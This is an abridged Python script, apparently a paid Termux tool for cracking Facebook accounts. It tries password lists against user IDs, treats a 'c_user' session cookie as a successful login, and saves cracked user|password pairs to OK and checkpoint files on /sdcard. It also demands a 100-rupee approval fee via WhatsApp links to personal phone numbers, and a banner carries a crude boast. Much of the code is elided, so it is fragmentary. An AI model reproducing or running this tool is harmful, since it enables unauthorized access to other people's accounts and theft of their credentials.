...
def main_apv():
    ...
    try:
        ...
        print ("༄4d33L᭄•──────B3W4F4 ───────BOLTI ─────PUBLIC───APUN──KO───•༄𝑘ℎ𝑎𝑛᭄")
    ...
    if key1 in r1:
        ...
        print ("         ༄4d33L᭄•──────B3W4F4 ───────BOLTI ─────PUBLIC───APUN──KO───•༄𝑘ℎ𝑎𝑛᭄")
        print ("             \033[1;94mGIVE ME 100RS FOR APROVAL ༄4d33L᭄")     
        ...
        os.system('am start https://wa.me/+923297331824?text=' + tks)
...
logo="""
 ...
 |____/  |______|     \/  \/     /_/    \_\ |_|/_/    \_\
        ...
        \033[1;92m༄4d33L᭄•──────B3W4F4 ───────BOLTI ─────PUBLIC───APUN──KO───•༄𝑘ℎ𝑎𝑛᭄
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;95mAUTHOR   : ༄4d33L᭄KHAN                        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : ༄KHAN                                        \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : ༄SULMAN᭄KABIR (🥰) \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +923297331824                  \033[1;93m▇▇
             \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS PAID                                    \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mtoll prise 100RS FOR APRVAL                   \033[1;93m▇▇
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
         \033[1;92m༄4d33L᭄•──────B3W4F4 ───────BOLTI ─────PUBLIC───APUN──KO───•༄𝑘ℎ𝑎𝑛᭄
""" 
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/༄4d33L᭄-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/༄4d33L᭄-CP.txt' % (H, P, str(len(cp))))
...
def R():
			...
			print ("\033[1;93m▇▇➣\033[1;97m❥❥❥❥❥❥❥\033[1;94mHTRZ MKC FARN3 WALA JALLAD  : SULMAN HERE")
			print ('\033[1;92m༄4d33L᭄•──────B3W4F4 ───────BOLTI ─────PUBLIC───APUN──KO───•༄𝑘ℎ𝑎𝑛᭄')
			key = input(" [*] Choose : ")
			print ('༄4d33L᭄•──────B3W4F4 ───────BOLTI ─────PUBLIC───APUN──KO───•༄𝑘ℎ𝑎𝑛᭄')
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[༄4d33L᭄]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [༄4d33L᭄-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/༄4d33L᭄_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/༄4d33L᭄_CP.txt' , 'a').write('%s\n' % wrt)
...
def dupcutter():
	...
	os.system("xdg-open https://wa.me/+923444819642")
